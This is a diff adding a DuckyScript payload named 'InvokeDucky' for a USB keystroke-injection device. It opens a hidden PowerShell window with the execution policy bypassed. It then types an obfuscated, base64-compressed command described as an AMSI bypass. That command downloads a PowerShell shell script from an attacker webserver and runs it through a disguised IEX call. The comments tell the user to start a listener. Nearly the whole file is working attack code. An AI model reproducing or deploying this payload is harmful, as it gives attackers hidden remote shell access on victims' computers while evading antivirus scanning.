@@ -1,0 +1,32 @@
+REM       InvokeDucky
+REM       Version 1.0
+REM       OS: Windows / Linux(?) (Not tested with Powershell on Linux)
+REM       Author: 0iphor13
+
+REM       AMSI bypass and using of IEX to execute powershell scripts.
+REM       Fill in URL at line []
+REM       DON'T FORGET TO START LISTENER & WEBSERVER
+
+DELAY 1500
+GUI r
+DELAY 500
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass
+DELAY 250
+ENTER
+
+DELAY 100
+STRING $URL='http://192.168.178.25:8080/Invoke-Powershellshell.ps1'; ( NEW-o
+DELAY 200
+STRING bJEcT sySTEM.io.CoMPrESSIOn.DeFLaTEsTREAM( [io.mEMorYSTReAm] [conVeRt]::FrOMbaSE64STring( 'pY3bSsNAEIZfpYSV7tp0yW4Os6H0
+DELAY 200
+STRING ovWEIFEaTxCCJOmokTUtyYZS1Hd30174ADIM/IfhG7KYO2EQSxUpAKk8AYGVSlgbDN6uUCDAt6ECZRMrACKrnBlZzh1x6DwVQRQOjAhiFdmbQxIESsCAGni
+DELAY 200
+STRING 2AQnCmWUrfM35ouvws9R7foXmfr9FmnWmrZu3nHqc+/B98pVV70WbZ3VjcirjCSWLCVky3vXl8ZJS8nIqmSsZ+2HTFre6qHDk2GED9LJGvf6j+orzUPwH64
+DELAY 200
+STRING 6TTXPXl7qu3NQUpq7GjKdoHgvdIyVNr7VLTNsjm11fPI9ogrvpbfmBlRklaPgTlme6xsYwfr7ZNXpTrNPjQ/KwumG/' ) , [io.coMpresSioN.COmPREs
+DELAY 200
+STRING sIONmodE]::DecompRESs) | foreACh-ObjECT{ NEW-obJEcT IO.STrEamrEAder($_ ,[sYStEM.TExT.ENCODIng]::Ascii ) } |FoREAcH-Obje
+DELAY 200
+STRING cT { $_.REaDToEnd( )}) | .((gV '*MDr*').Name[3,11,2]-JoIn'')
+DELAY 100
+ENTER
